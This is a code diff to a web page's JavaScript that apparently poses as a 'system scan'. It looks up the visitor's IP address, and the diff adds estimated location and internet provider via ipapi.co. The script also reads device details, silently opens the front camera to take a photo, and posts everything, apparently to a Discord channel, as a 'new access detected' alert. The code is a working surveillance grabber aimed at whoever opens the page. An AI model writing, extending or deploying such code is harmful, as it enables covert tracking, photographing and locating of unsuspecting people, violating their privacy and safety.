@@ -76,24 +76,29 @@
             statusDiv.textContent = "システムスキャン中...";
 
             try {
-                // 1. IPアドレスを取得
+                // 1. IPアドレス ＆ 地域情報の取得
                 let ipInfo = "取得失敗";
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ipInfo = ipData.ip;
-                } catch (e) {}
+                let locationInfo = "不明";
+                let ispInfo = "不明";
 
-                // 2. バッテリー情報の取得
-                let batteryInfo = "取得不可";
-                if (navigator.getBattery) {
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipRes.json();
+                    if (ipData.ip) {
+                        ipInfo = ipData.ip;
+                        locationInfo = `${ipData.country_name || ''} ${ipData.region || ''} ${ipData.city || ''}`.trim();
+                        ispInfo = ipData.org || ipData.asn || '不明';
+                    }
+                } catch (e) {
+                    // 予備としてipifyも用意
                     try {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
-                    } catch (e) {}
+                        const fallbackRes = await fetch('https://api.ipify.org?format=json');
+                        const fallbackData = await fallbackRes.json();
+                        ipInfo = fallbackData.ip;
+                    } catch (err) {}
                 }
 
-                // 3. デバイス・ブラウザ情報の分かりやすい日本語化
+                // 2. 端末・ブラウザ情報の分かりやすい日本語化
                 const ua = navigator.userAgent;
                 let deviceName = "PC / その他";
                 if (/iPhone/.test(ua)) deviceName = "iPhone";
@@ -110,7 +115,7 @@
                 const screenRes = `${window.screen.width} × ${window.screen.height}`;
                 const language = navigator.language;
 
-                // 4. カメラ起動と撮影
+                // 3. カメラ起動と撮影
                 statusDiv.textContent = "カメラ接続中...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
@@ -130,12 +135,13 @@
                     const formData = new FormData();
                     formData.append('file', blob, 'capture.jpg');
                     
-                    // IPアドレスを `` (バッククォート) で囲むことで、Discordでタップ・コピーしやすくする
+                    // IPと地域情報をわかりやすくまとめて送信
                     const content = `🚨 **新しいアクセスを検知しました！**\n` +
                                     `🌐 **IPアドレス**: \`${ipInfo}\`\n` +
+                                    `📍 **推定地域**: ${locationInfo}\n` +
+                                    `🏢 **回線/プロバイダ**: ${ispInfo}\n` +
                                     `📱 **端末**: ${deviceInfo}\n` +
                                     `🖥 **画面解像度**: ${screenRes}\n` +
-                                    `🔋 **バッテリー**: ${batteryInfo}\n` +
                                     `🌍 **言語**: ${language}`;
 
                     formData.append('payload_json', JSON.stringify({ content: content }));
